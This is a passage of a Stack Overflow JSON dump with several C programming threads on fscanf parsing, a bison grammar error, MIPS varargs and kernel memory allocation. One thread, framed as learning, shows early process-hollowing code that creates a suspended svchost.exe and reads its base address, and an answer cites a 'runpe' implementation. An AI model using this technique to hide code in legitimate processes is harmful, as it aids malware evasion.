(always) limit the length of each string field read with a <code>scanf</code> family function to one less than the available space (the terminating NUL byte is the +1). So, for example, if the first field is at most 9 characters long, you would need <code>char field1[10]</code> and the format would be <code>%9[^;]</code>.</p>\n\n<p>It is usually a good idea to put a single space in the beginning of the format string to consume any whitespace (such as the previous newline).</p>\n\n<p>And, of course you should check the return value of <code>fscanf</code>, e.g., if you have 9 fields as per the example, it should return <code>9</code>.</p>\n\n<p>So, the end result would be something like:</p>\n\n<pre><code>if (fscanf(file, \" %9[^;];%99[^;];%99[^;];%d;%c;%99[^;];%d;%99[^;];%99[^\\n]\",\n           s.field1, s.field2, s.field3, &amp;s.field4, \u2026, s.field9) != 9) {\n    // error\n    break;\n}\n</code></pre>\n\n<p>(Alternatively, the field with numbers separated by commas could be read as four separate fields as <code>%d,%d,%d,%d</code>, in which case the count would go up to 12.)</p>\n"}], "owner": {"reputation": 3, "user_id": 6942482, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ff4ff741186abb77ed8fe30e81123842?s=128&d=identicon&r=PG&f=1", "display_name": "Jen", "link": "https://stackoverflow.com/users/6942482/jen"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 62, "favorite_count": 0, "accepted_answer_id": 53937692, "answer_count": 2, "score": 0, "last_activity_date": 1545990663, "creation_date": 1545859210, "last_edit_date": 1545990663, "question_id": 53937287, "link": "https://stackoverflow.com/questions/53937287/scanning-data-from-text-file-that-doesnt-have-spacing-between-each-item-of-dat", "title": "Scanning data from text file, that doesn&#39;t have spacing between each item of data", "body": "<p>I have encountered a problem with my homework. I need to scan some data from a text file, to a struct. \nThe text file looks like this.</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>012345678;danny;cohen;22;M;danny1993;123;1,2,4,8;Nice person\n223325222;or;dan;25;M;ordan10;1234;3,5,6,7;Singer and dancer\n203484758;shani;israel;25;F;shaninush;12345;4,5,6,7;Happy and cool girl\n349950234;nadav;cohen;50;M;nd50;nadav;3,6,7,8;Engineer very smart\n345656974;oshrit;hasson;30;F;osh321;111;3,4,5,7;Layer and a painter \n</code></pre>\n\n<p>Each item of data to its matching variable.\nid = 012345678\nfirst_name = danny\netc...</p>\n\n<p>Now I can't use fscanf because there is no spacing, and the fgets scanning all the line.</p>\n\n<p>I found some solution with %[^;]s, but then I will need to write one block of code and, copy and past it 9 times for each item of data.</p>\n\n<p>Is there any other option without changing the text file, that similar to the code I would write with fscanf, if there was spacing between each item of data?</p>\n\n<p>************* UPDATE **************</p>\n\n<p>Hey, First of all, thanks everyone for the help really appreciating.\nI didn't understand all your answers, but here something I did use.</p>\n\n<p>Here's my code :</p>\n\n<pre><code>#define _CRT_SECURE_NO_WARNINGS\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n\ntypedef struct\n{\n    char *idP, *firstNameP, *lastNameP;\n    int age;\n    char gender, *userNameP, *passwordP, hobbies, *descriptionP;\n}user;\n\n\nvoid main() {\n    FILE *fileP;\n    user temp;\n    char test[99];\n\n    temp.idP = (char *)malloc(99);\n    temp.firstNameP = (char *)malloc(99);\n    temp.lastNameP = (char *)malloc(99);\n    temp.age = (int )malloc(4);\n    temp.gender = (char )malloc(sizeof(char));\n    temp.userNameP = (char *)malloc(99);\n\n    fileP = fopen(\"input.txt\", \"r\");\n    fscanf(fileP, \"%9[^;];%99[^;];%99[^;];%d;%c\", temp.idP,temp.firstNameP,temp.lastNameP,&amp;temp.age, temp.gender);\n    printf(\"%s\\n%s\\n%s\\n%d\\n%c\", temp.idP, temp.firstNameP, temp.lastNameP, temp.age, temp.gender);\n\n    fgets(test, 60, fileP); // Just testing where it stop scanning\n    printf(\"\\n\\n%s\", test);\n\n    fclose(fileP);\n    getchar();\n}\n</code></pre>\n\n<p>It all works well until I scan the int variable, right after that it doesn't scan anything, and I get an error.</p>\n\n<p>Thanks a lot.</p>\n"}, {"tags": ["c", "bison", "flex-lexer"], "comments": [{"owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 0, "creation_date": 1545860102, "post_id": 53937174, "comment_id": 94714811, "body": "Do you only allow a single variable to be declared in a <code>declaration</code>? If you want to allow multiple declarations, you should do it similarly to <code>commands</code>."}, {"owner": {"reputation": 7824, "user_id": 3899431, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/UeEzu.jpg?s=128&g=1", "display_name": "Luis Colorado", "link": "https://stackoverflow.com/users/3899431/luis-colorado"}, "edited": false, "score": 0, "creation_date": 1546088752, "post_id": 53937174, "comment_id": 94777037, "body": "It&#39;s possible that the error is not in the <code>main()</code> function, but have you read <a href=\"https://stackoverflow.com/help/mcve\">How to create a Minimal, Complete, and Verifiable example</a>?  It&#39;s important you follow the guidelines in that text, because you probably are hidding important information about your problem."}], "answers": [{"comments": [{"owner": {"reputation": 37, "user_id": 9226559, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f1cda9261d4e17d027a9664ef043ea66?s=128&d=identicon&r=PG&f=1", "display_name": "Emarth", "link": "https://stackoverflow.com/users/9226559/emarth"}, "edited": false, "score": 0, "creation_date": 1545912126, "post_id": 53937362, "comment_id": 94728105, "body": "Thanks I&#39;ll try to repair my grammar"}], "tags": [], "owner": {"reputation": 78982, "user_id": 1848654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/84180c0f3c9c04f8b8f0613fc0129dac?s=128&d=identicon&r=PG", "display_name": "melpomene", "link": "https://stackoverflow.com/users/1848654/melpomene"}, "is_accepted": true, "score": 3, "last_activity_date": 1545859687, "creation_date": 1545859687, "answer_id": 53937362, "question_id": 53937174, "link": "https://stackoverflow.com/questions/53937174/bison-says-that-start-symbol-does-not-derive-any-sentence/53937362#53937362", "title": "Bison says that start symbol does not derive any sentence", "body": "<p>Your grammar says to have a <code>program</code>, you must have a <code>declaration</code>:</p>\n\n<pre><code>program         :   DECLARE declaration ...\n</code></pre>\n\n<p>And the only way to get a declaration is these two rules</p>\n\n<pre><code>declaration :   declaration ...\n                    |   declaration ...\n</code></pre>\n\n<p>But both of those require you to already have a <code>declaration</code>. Since you start out with nothing, and you can only get a <code>declaration</code> if you already have one, you can never have any declarations.</p>\n\n<p>Therefore you can never parse a <code>program</code>.</p>\n"}, {"tags": [], "owner": {"reputation": 7824, "user_id": 3899431, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/UeEzu.jpg?s=128&g=1", "display_name": "Luis Colorado", "link": "https://stackoverflow.com/users/3899431/luis-colorado"}, "is_accepted": false, "score": 0, "last_activity_date": 1546089761, "last_edit_date": 1592644375, "creation_date": 1546089414, "answer_id": 53969903, "question_id": 53937174, "link": "https://stackoverflow.com/questions/53937174/bison-says-that-start-symbol-does-not-derive-any-sentence/53969903#53969903", "title": "Bison says that start symbol does not derive any sentence", "body": "<p>Normally, when bison says that, it is complaining about the grammar you have feed it with.  That error message means that with that grammar it is impossible to build a valid sentence, consisting only of terminal symbols.  Your grammar must be patched to be able to build syntax trees <strong>that have in the leaves only terminal symbols</strong>.  If you check that, you'll find that it is actually impossible to build a parse tree that has only terminal symbols in the leaves. Try and watch for yourself.  This happens with this simple grammar.</p>\n<pre><code>sentence: '*' sentence\n    | '(' sentence ')' ;\n</code></pre>\n<p>you will see that all parse trees you build for <code>sentence</code> always have a <code>sentence</code> as one of its leaves, so it's impossible to build a valid sentence in that language that has only terminal symbols.</p>\n<p>The technical details of your concrete problem are discussed in other answer, so I'll not repeat them here (Bison uses the first rule you write in the grammar to use as root of the syntactic tree, by default, in your case is <code>declaration</code>, and not program)</p>\n<p>Anyway, if you got that error, probably this is not the only problem you are having.  If you try <code>bison</code> with option <code>--report</code> and <code>--report-file</code> (see manpage) you'll get a more detailed info about the rule that is making it to fail.</p>\n<h1>edit</h1>\n<p>after looking at your code, you expand <code>declaration</code> as <code>declaration</code> and more things in <strong>all the alternatives you give for <code>declaration</code></strong> This can never generate a declaration of only terminal symbols, because as you expand, there's always a <code>declaration</code> to expand.</p>\n"}], "owner": {"reputation": 37, "user_id": 9226559, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f1cda9261d4e17d027a9664ef043ea66?s=128&d=identicon&r=PG&f=1", "display_name": "Emarth", "link": "https://stackoverflow.com/users/9226559/emarth"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 303, "favorite_count": 0, "accepted_answer_id": 53937362, "answer_count": 2, "score": 1, "last_activity_date": 1546089761, "creation_date": 1545858462, "question_id": 53937174, "link": "https://stackoverflow.com/questions/53937174/bison-says-that-start-symbol-does-not-derive-any-sentence", "title": "Bison says that start symbol does not derive any sentence", "body": "<p>I'm writting basic compiler and I got stuck preatty early. When I try to run my bison file it throws error (it's below) I have no idea why it does and have been struggling with it for quite some time.</p>\n\n<p>ERROR:</p>\n\n<pre><code>compiler/parser.y: warning: 9 nonterminals useless in grammar [-Wother]\ncompiler/parser.y: warning: 32 rules useless in grammar [-Wother]\ncompiler/parser.y:34.1-7: fatal error: start symbol program does not derive any sentence\n program            :   DECLARE declaration IN commands END\n</code></pre>\n\n<p>FLEX:</p>\n\n<pre><code>%option noyywrap\n%{\n    #include &lt;stdio.h&gt;\n    #include \"parser.tab.h\"\n%}\n\nNUMBER          [0-9]+\nPID                 [_a-z]+\n\nWHITESPACE  [ \\t\\r]+\n\n%x COMMENT\n%%\n\n&lt;INITIAL&gt;{\n\"[\"                     BEGIN(COMMENT);\n\n\\n                      yylineno++;\n{WHITESPACE}\n\n{NUMBER}            {\n                                printf(\"Number: %s\\n\", yytext);\n                                yylval.ival = (char*) strdup(yytext);\n                                return NUM;\n                            }\n\n{PID}                   {\n                                printf(\"PID: %s\\n\", yytext);\n                                yylval.sval = (char*) strdup(yytext);\n                                return PID;\n                            }\n\n\":=\"                    return ASSIGN;\n\n\"+\"                     return ADD;\n\"-\"                     return SUB;\n\"*\"                     return MUL;\n\"/\"                     return DIV;\n\"%\"                     return MOD;\n\n\"=\"                     return EQ;\n\"!=\"                    return NEQ;\n\"&lt;\"                     return LT;\n\"&gt;\"                     return GT;\n\"&lt;=\"                    return LE;\n\"&gt;=\"                    return GE;\n\n\")\"                     return R_BRACKET;\n\"(\"                     return L_BRACKET;\n\";\"                     return SEMICOLON;\n\":\"                     return COLON;\n\n\n\"DECLARE\"           return DECLARE;\n\"IN\"                    return IN;\n\"END\"                   return END;\n\n\"IF\"                    return IF;\n\"ELSE\"              return ELSE;\n\"ENDIF\"             return ENDIF;\n\n\"WHILE\"             return WHILE;\n\"DO\"                    return DO;\n\"ENDWHILE\"      return ENDWHILE;\n\"ENDDO\"             return ENDDO;\n\n\"FOR\"                   return FOR;\n\"FROM\"              return FROM;\n\"TO\"                    return TO;\n\"DOWNTO\"            return DOWNTO;\n\"ENDFOR\"            return ENDFOR;\n\n\"READ\"              return READ;\n\"WRITE\"             return WRITE;\n}\n\n&lt;COMMENT&gt;{\n\"]\"                     BEGIN(INITIAL);\n[^\\n]+\\n            yylineno++;\n}\n\n%%\n</code></pre>\n\n<p>BISON:</p>\n\n<pre><code>%{\n    #include &lt;stdio.h&gt;\n    #include &lt;stdlib.h&gt;\n    #include &lt;string.h&gt;\n\n    extern int yylineno;\n\n    int yylex(void);\n    void yyerror(const char *);\n\n    int error = 0;\n%}\n\n%union{\n    char* sval;\n    char* ival;\n}\n\n%token &lt;sval&gt; DECLARE /* Declarations block */\n%token &lt;sval&gt; IN END /* Code block */\n%token &lt;sval&gt; IF THEN ELSE ENDIF /* Conditional block */\n%token &lt;sval&gt; WHILE DO ENDWHILE ENDDO /* While-do and Do-while loop block */\n%token &lt;sval&gt; FOR FROM TO DOWNTO ENDFOR /* For loop block */\n%token &lt;sval&gt; READ WRITE\n%token &lt;sval&gt; ASSIGN\n%token &lt;sval&gt; ADD SUB MUL DIV MOD /* Arithmetic operators */\n%token &lt;sval&gt; EQ NEQ LT GT LE GE /* Boolean operators */\n%token &lt;sval&gt; L_BRACKET R_BRACKET SEMICOLON COLON /* Symbols */\n%token &lt;ival&gt; NUM\n%token &lt;sval&gt; PID\n\n%%\n\nprogram         :   DECLARE declaration IN commands END\n                        ;\n\ndeclaration :   declaration PID SEMICOLON\n                        |   declaration PID L_BRACKET NUM COLON NUM R_BRACKET SEMICOLON\n                        ;\n\ncommands        :   commands command\n                        |   command\n                        ;\n\ncommand         :   id ASSIGN expression SEMICOLON\n                        |   IF condition THEN commands ELSE commands ENDIF\n                        |   IF condition THEN commands ENDIF\n                        |   WHILE condition DO commands ENDWHILE\n                        |   DO commands WHILE condition ENDDO\n                        |   FOR PID FROM value TO value DO commands ENDFOR\n                        |   FOR PID FROM value DOWNTO value DO commands ENDFOR\n                        |   READ id SEMICOLON\n                        |   WRITE value SEMICOLON\n                        ;\n\nexpression  :   value\n                        |   value ADD value\n                        |   value SUB value\n                        |   value MUL value\n                        |   value DIV value\n                        |   value MOD value\n                        ;\n\ncondition       :   value EQ value\n                        |   value NEQ value\n                        |   value LT value\n                        |   value GT value\n                        |   value LE value\n                        |   value GE value\n                        ;\n\nvalue               :   NUM\n                        |   id\n                        ;\n\nid                  :   PID\n                        |   PID L_BRACKET PID R_BRACKET\n                        |   PID L_BRACKET NUM R_BRACKET\n                        ;\n\n%%\n\nvoid yyerror(const char *msg) {\n    fprintf(stderr, \"Compiling error: %s\\n\", msg);\n}\n</code></pre>\n\n<p>In case you're wondering, I run main function from another file but I don't think that is the problem.</p>\n"}, {"tags": ["c", "winapi", "memory", "createprocess", "base-address"], "answers": [{"tags": [], "owner": {"reputation": 2634, "user_id": 8985046, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/oqc2A.jpg?s=128&g=1", "display_name": "GuidedHacking", "link": "https://stackoverflow.com/users/8985046/guidedhacking"}, "is_accepted": true, "score": 0, "last_activity_date": 1587607675, "creation_date": 1587607675, "answer_id": 61378163, "question_id": 53937016, "link": "https://stackoverflow.com/questions/53937016/finding-the-base-address-after-creating-suspended-process/61378163#61378163", "title": "Finding the base address after creating suspended process", "body": "<p>You never set context.ContextFlags, you must set it to CONTEXT_INTEGER before calling GetThreadContext().</p>\n\n<p>Here's a sample code:</p>\n\n<pre><code>#if defined(_WIN64)\n    WOW64_CONTEXT context;\n    memset(&amp;context, 0, sizeof(WOW64_CONTEXT));\n    context.ContextFlags = CONTEXT_INTEGER;\n    Wow64GetThreadContext(pi.hThread, &amp;context);\n#else   \n    CONTEXT context;\n    memset(&amp;context, 0, sizeof(CONTEXT));\n    context.ContextFlags = CONTEXT_INTEGER;\n    GetThreadContext(pi.hThread, &amp;context);\n#endif\n</code></pre>\n\n<p>Taken from hasherezade's excellent <a href=\"https://github.com/hasherezade/demos/blob/master/run_pe/src/runpe.h\" rel=\"nofollow noreferrer\">runpe</a> implementation</p>\n"}], "owner": {"reputation": 13, "user_id": 7200201, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c1eacee3b629fe1b7a458166fd1d87de?s=128&d=identicon&r=PG&f=1", "display_name": "E. K919", "link": "https://stackoverflow.com/users/7200201/e-k919"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 402, "favorite_count": 1, "accepted_answer_id": 61378163, "answer_count": 1, "score": 1, "last_activity_date": 1587607675, "creation_date": 1545857323, "last_edit_date": 1546557959, "question_id": 53937016, "link": "https://stackoverflow.com/questions/53937016/finding-the-base-address-after-creating-suspended-process", "title": "Finding the base address after creating suspended process", "body": "<p>i'm trying to learn how to do process hollowing / replacement (for the sake of learning). I've created a <strong>32bit process</strong> in a suspended state, afterwards i need the base address of that process in order to later unmap from memory and replace with something else.</p>\n\n<p>From my research i can get it from the PEB of the process, which includes that address. also from what i understood the PEB is always located in the ebx register, and the entrypoint is located in the eax register.</p>\n\n<p><strong>HOWEVER</strong>, when i get the context for the main thread (which holds the content of the registers) it's all zero which makes no sense to me, but it doesn't fail.</p>\n\n<p><strong>SECOND PROBLEM</strong>. when i read the process memory i get <strong>error 299 (12B)</strong> which from what i understand occurs when trying to read memory of a 64bit from 32bit (but remember that i'm running a 32bit process).</p>\n\n<pre><code>#include &lt;Windows.h&gt;\n#include &lt;tchar.h&gt;\n#include &lt;stdio.h&gt;\n\nvoid end_program(LPPROCESS_INFORMATION pinfo, LPSTARTUPINFO stinfo)\n{\n    TerminateProcess(pinfo-&gt;hProcess, 1);\n    CloseHandle(pinfo-&gt;hProcess);\n    CloseHandle(pinfo-&gt;hThread);\n    CloseHandle(stinfo-&gt;hStdError);\n    CloseHandle(stinfo-&gt;hStdInput);\n    CloseHandle(stinfo-&gt;hStdOutput);\n    system(\"pause\");\n}\n\nvoid main()\n{\n    // Create process suspended\n    PROCESS_INFORMATION process_info;\n    STARTUPINFO start_info;\n    ZeroMemory(&amp;process_info, sizeof(process_info));\n    ZeroMemory(&amp;start_info, sizeof(start_info));\n    TCHAR path[100] = TEXT(\"C:\\\\Windows\\\\SysWOW64\\\\svchost.exe\");\n    if (!CreateProcess(NULL, path, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &amp;start_info, &amp;process_info))\n    {\n        printf(\"Failed creating process: error 0x%p\", GetLastError());\n        return;\n    }\n    printf(\"PID: %i Handle: 0x%p\\r\\n\", process_info.dwProcessId, process_info.hProcess);\n\n    // Get context of thread\n    CONTEXT context;\n    ZeroMemory(&amp;context, sizeof(context));\n    if (!GetThreadContext(process_info.hThread, &amp;context))\n    {\n        printf(\"Failed getting context: error 0x%p\\r\\n\", GetLastError());\n        end_program(&amp;process_info, &amp;start_info);\n        return;\n    }\n    printf(\"Context recieved!\\r\\n\");\n\n    // Get base address\n    PVOID base_address;\n    ZeroMemory(&amp;base_address, sizeof(base_address));\n    if (!ReadProcessMemory(process_info.hProcess, (BYTE)(context.Ebx + 8), &amp;base_address, sizeof(PVOID), NULL))\n    {\n        printf(\"Error reading file: error 0x%p\\r\\n\", GetLastError());\n        end_program(&amp;process_info, &amp;start_info);\n        return;\n    }\n\n    // Bugs that haven't been uncovered yet goes here\n\n\n\n\n    // End of program\n    end_program(&amp;process_info, &amp;start_info);\n}\n</code></pre>\n\n<p>note 1: research said that the PEB with offset of 8 bytes is the base address.</p>\n\n<p>note 2: tried to snapshot all process but same error, also tried enumprocessmodules, same error occurs.</p>\n\n<p>note 3: everything i found online is for finding the base address of a running process, which i tried and succeeded, but since no modules are loaded yet in suspended (as it appears in taskmanager since there's no name for the process, could be wrong though), it doesn't work for me.</p>\n\n<p>note 4: i'm also kind of new to coding in C, so sorry if something looks odd.</p>\n\n<p>any help will be gladly appriciated. if you have other ways to get base address i'd love to hear.\nsorry if the code the a little messy, or if i wasn't clear. i'll do my best to explain...</p>\n\n<p>forgot to add: my system is Windows 10 64bit</p>\n\n<p>Edit: Fixed the problem. needed to do context.ContextFlags=CONTEXT_INTEGER.\nthat allowed me to read. also the readprocess memory failed because i gave it wrong address to read from (basically 0+8=8) which i assume was for a 64bit process</p>\n"}, {"tags": ["c", "mips"], "answers": [{"comments": [{"owner": {"reputation": 131, "user_id": 10772961, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-hjIVvquN5oU/AAAAAAAAAAI/AAAAAAAAAAA/AGDgw-gy9zaCDI6QCTiaA-lO2sN89YILOg/mo/photo.jpg?sz=128", "display_name": "Alin Catalin Preda", "link": "https://stackoverflow.com/users/10772961/alin-catalin-preda"}, "edited": false, "score": 0, "creation_date": 1545865572, "post_id": 53938000, "comment_id": 94716111, "body": "Yes, that is what confused me"}], "tags": [], "owner": {"reputation": 37414, "user_id": 204883, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ba29060be0758fa6537ff3d768a91757?s=128&d=identicon&r=PG", "display_name": "Arkku", "link": "https://stackoverflow.com/users/204883/arkku"}, "is_accepted": false, "score": 0, "last_activity_date": 1545865287, "last_edit_date": 1545865287, "creation_date": 1545864862, "answer_id": 53938000, "question_id": 53936606, "link": "https://stackoverflow.com/questions/53936606/i-cant-understand-a-portion-of-code-from-a-mips-problem/53938000#53938000", "title": "I can&#39;t understand a portion of code from a MIPS problem", "body": "<p>My MIPS assembly is very rusty, but it would seem:</p>\n\n<pre><code>lw $t0,-12($fp)   # load va_list l\naddu $t0,4        # increment l to the next int argument\nsw $t0,-12($fp)   # store l\n\nlw $t0,-4($t0)    # load the argument pointed to by l (still in $t0)\nlw $t1,-8($fp)    # load sum\nadd $t1,$t1,$t0   # add the argument to sum\nsw $t1,-8($fp)    # store sum\n\nlw $t0,-4($fp)    # load i\nadd $t0,1         # increment i by 1\nsw $t0,-4($fp)    # store i\n</code></pre>\n\n<p>I suppose the confusing part is that <code>va_list l</code> contains a pointer internally, and is incremented inside the <code>va_arg</code> macro.</p>\n"}], "owner": {"reputation": 131, "user_id": 10772961, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-hjIVvquN5oU/AAAAAAAAAAI/AAAAAAAAAAA/AGDgw-gy9zaCDI6QCTiaA-lO2sN89YILOg/mo/photo.jpg?sz=128", "display_name": "Alin Catalin Preda", "link": "https://stackoverflow.com/users/10772961/alin-catalin-preda"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 71, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1545865287, "creation_date": 1545854679, "question_id": 53936606, "link": "https://stackoverflow.com/questions/53936606/i-cant-understand-a-portion-of-code-from-a-mips-problem", "title": "I can&#39;t understand a portion of code from a MIPS problem", "body": "<p>So, I have a problem which translates a C program that calculates the sum of n numbers with a function with a variable number of parameters.</p>\n\n<pre><code>#include&lt;stdarg.h&gt;\n  int sum(int n, ...){\n    int i,s;\n    va_list l;\n    va_start(l,n);\n    s=0;\n    for(i=0;i&lt;n;++i) s+=va_arg(l,int);\n    va_end(l);\n    return s;\n  }\n  int s;\n  void main(){\n    s=sum(3,1,2,3);  \n    s=sum(2,10,20);\n  }\n</code></pre>\n\n<p>Here is the MIPS code (ignore the comments), but I can't understand the part below bge, specifically the $t0 operations, what exactly happens when it adds 4 to $t0, I know that if it stores an integer it will simply add 4 to that number, and if I refer to the $sp, then add $sp, 4 would mean the pop operation. I'm really confused about what is happening on that part.</p>\n\n<pre><code>.data\n  s: .space 4\n.text\nmain:\n  subu $sp,16   # incarcam parametrii, conform conventiei C\n  li $t0,3\n  sw $t0,12($sp)\n  li $t0,2\n  sw $t0,8($sp)\n  li $t0,1\n  sw $t0,4($sp)\n  li $t0,3\n  sw $t0,0($sp)\n  jal sum      # functia returneaza in $v0\n  addu $sp,16    # descarcam atatia par. cati am incarcat (adica 4 parametri)\n  sw $v0,s       # val. ret. este in $v0\n    # acum s contine 6\n  subu $sp,12\n  li $t0,20\n  sw $t0,8($sp)\n  li $t0,10\n  sw $t0,4($sp)\n  li $t0,2\n  sw $t0,0($sp)\n  jal sum\n  addu $sp,12     # acum am incarcat doar 3 par., deci descarc doar 3 par.\n  sw $v0,s\n    # acum s contine 30\nli $v0,10\nsyscall\nsum:   # primeste o stiva de forma $sp:(n)()()()...\n  subu $sp,16      # rezerv loc pt. salvat $fp si pentru i,s,l din functie\n  sw $fp,12($sp)\n  addiu $fp,$sp,12\n    # acum stiva este $sp:(l)(s)(i)$fp:($fp v)(n)()()()...\n  addu $t0,$fp,8\n  sw $t0,-12($fp)  # va_start(l,n); avem $sp:(l)(s)(i)$fp:($fp v)(n)l:()()...\n  sw $zero,-8($fp) # s=0\n  sw $zero,-4($fp) # i=0\n  sum_et1:\n  lw $t0,-4($fp)\n  lw $t1,4($fp)\n  bge $t0,$t1,sum_et2  # daca i&gt;=n iesim\n    lw $t0,-12($fp)\n    addu $t0,4           # 4 este sizeof(int)\n    sw $t0,-12($fp)\n    lw $t0,-4($t0)       # 4 este sizeof(int)\n    lw $t1,-8($fp)\n    add $t1,$t1,$t0\n    sw $t1,-8($fp)       # s+=va_arg(i,int)\n    lw $t0,-4($fp)\n    add $t0,1\n    sw $t0,-4($fp)       # ++i\n    b sum_et1\n  sum_et2:\n    # in aceasta implementare nu avem ce executa pentru va_end(l)\n  lw $v0,-8($fp)\n  lw $fp,0($fp)\n  addu $sp,16\njr $ra\n</code></pre>\n"}, {"tags": ["c", "linux", "caching", "io", "linux-kernel"], "comments": [{"owner": {"reputation": 49065, "user_id": 13422, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/94b309d78a1253a334e9b82643a8dc97?s=128&d=identicon&r=PG", "display_name": "Zan Lynx", "link": "https://stackoverflow.com/users/13422/zan-lynx"}, "edited": false, "score": 0, "creation_date": 1545857071, "post_id": 53936183, "comment_id": 94713943, "body": "You are overly focused on disk cache. Forget about it. Instead go look at how the rest of the Linux kernel network code allocates memory."}, {"owner": {"reputation": 49065, "user_id": 13422, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/94b309d78a1253a334e9b82643a8dc97?s=128&d=identicon&r=PG", "display_name": "Zan Lynx", "link": "https://stackoverflow.com/users/13422/zan-lynx"}, "edited": false, "score": 3, "creation_date": 1545857183, "post_id": 53936183, "comment_id": 94713965, "body": "<a href=\"https://stackoverflow.com/questions/21374491/vm-min-free-kbytes-why-keep-minimum-reserved-memory\" title=\"vm min free kbytes why keep minimum reserved memory\">stackoverflow.com/questions/21374491/&hellip;</a>"}, {"owner": {"reputation": 49065, "user_id": 13422, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/94b309d78a1253a334e9b82643a8dc97?s=128&d=identicon&r=PG", "display_name": "Zan Lynx", "link": "https://stackoverflow.com/users/13422/zan-lynx"}, "edited": false, "score": 1, "creation_date": 1545857286, "post_id": 53936183, "comment_id": 94713991, "body": "And a possibly relevant quote, &quot;The only time I&#39;ve had to increase min_free_kbytes is after enabling jumbo frames on a network card that didn&#39;t support dma scattering.&quot;"}, {"owner": {"reputation": 49065, "user_id": 13422, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/94b309d78a1253a334e9b82643a8dc97?s=128&d=identicon&r=PG", "display_name": "Zan Lynx", "link": "https://stackoverflow.com/users/13422/zan-lynx"}, "edited": false, "score": 0, "creation_date": 1545857416, "post_id": 53936183, "comment_id": 94714027, "body": "You may need to create your own slab cache. It&#39;s an option."}, {"owner": {"reputation": 49065, "user_id": 13422, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/94b309d78a1253a334e9b82643a8dc97?s=128&d=identicon&r=PG", "display_name": "Zan Lynx", "link": "https://stackoverflow.com/users/13422/zan-lynx"}, "edited": false, "score": 1, "creation_date": 1545857480, "post_id": 53936183, "comment_id": 94714049, "body": "And sometimes you just have to tell the network sender &quot;This host / socket / whatever is full. Go away.&quot;"}, {"owner": {"reputation": 4173, "user_id": 4450651, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/l6IMB.jpg?s=128&g=1", "display_name": "red0ct", "link": "https://stackoverflow.com/users/4450651/red0ct"}, "reply_to_user": {"reputation": 49065, "user_id": 13422, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/94b309d78a1253a334e9b82643a8dc97?s=128&d=identicon&r=PG", "display_name": "Zan Lynx", "link": "https://stackoverflow.com/users/13422/zan-lynx"}, "edited": false, "score": 0, "creation_date": 1545857949, "post_id": 53936183, "comment_id": 94714202, "body": "@ZanLynx Thanks for your attention! About the first and the last comments: this is some production code which <b>has to do it in atomic context</b> and should pass some tests. It can&#39;t be completely rewritten now :("}, {"owner": {"reputation": 37954, "user_id": 905902, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a18869332564b1c3dfad9586d37095b2?s=128&d=identicon&r=PG", "display_name": "wildplasser", "link": "https://stackoverflow.com/users/905902/wildplasser"}, "edited": false, "score": 0, "creation_date": 1545857996, "post_id": 53936183, "comment_id": 94714219, "body": "1) What is the problem you try to solve? 2) what are you afraid of ?"}, {"owner": {"reputation": 4173, "user_id": 4450651, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/l6IMB.jpg?s=128&g=1", "display_name": "red0ct", "link": "https://stackoverflow.com/users/4450651/red0ct"}, "reply_to_user": {"reputation": 37954, "user_id": 905902, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a18869332564b1c3dfad9586d37095b2?s=128&d=identicon&r=PG", "display_name": "wildplasser", "link": "https://stackoverflow.com/users/905902/wildplasser"}, "edited": false, "score": 1, "creation_date": 1545858269, "post_id": 53936183, "comment_id": 94714288, "body": "@wildplasser 1) <b>Combine <code>kmalloc()</code> in atomic context with high loaded system while free memory is close to 0.</b> 2) I&#39;m not afraid of some solution because right now I have no  appropriate solution."}, {"owner": {"reputation": 49065, "user_id": 13422, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/94b309d78a1253a334e9b82643a8dc97?s=128&d=identicon&r=PG", "display_name": "Zan Lynx", "link": "https://stackoverflow.com/users/13422/zan-lynx"}, "edited": false, "score": 1, "creation_date": 1545859211, "post_id": 53936183, "comment_id": 94714531, "body": "Increase min_free_kbytes as much as you need to. If that does not solve your problem then your problem is unsolvable because it would indicate that your network is accepting traffic faster than you process it. If that is the case nothing can help you and all is doomed to failure."}, {"owner": {"reputation": 49065, "user_id": 13422, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/94b309d78a1253a334e9b82643a8dc97?s=128&d=identicon&r=PG", "display_name": "Zan Lynx", "link": "https://stackoverflow.com/users/13422/zan-lynx"}, "edited": false, 